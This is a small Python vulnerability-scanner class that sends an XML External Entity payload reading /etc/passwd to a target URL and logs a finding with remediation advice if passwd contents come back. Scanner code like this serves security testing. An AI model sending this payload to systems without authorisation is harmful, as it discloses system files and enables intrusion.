import requests

class XXEScanner:
    def __init__(self):
        self.findings = []

    def check_xxe(self, target_url, param_name):
        print(f"Checking for XXE on {target_url} with parameter {param_name}")
        # Basic XXE payload for file disclosure
        payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>'''
        
        headers = {
            'Content-Type': 'application/xml'
        }

        try:
            response = requests.post(target_url, data=payload, headers=headers, timeout=5)
            if "root:x:0:0" in response.text or "daemon:x:1:1" in response.text:
                self.findings.append({
                    'vulnerability': 'XML External Entity (XXE) Injection',
                    'severity': 'High',
                    'evidence': f'XXE detected with payload on {target_url}. Response contains sensitive file content.',
                    'remediation': 'Disable external entity processing in XML parsers. Use safer alternatives like JSON for data exchange.'
                })
                print(f"XXE detected: {target_url}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error checking XXE on {target_url}: {e}")
        print("XXE scan complete.")

    def get_findings(self):
        return self.findings


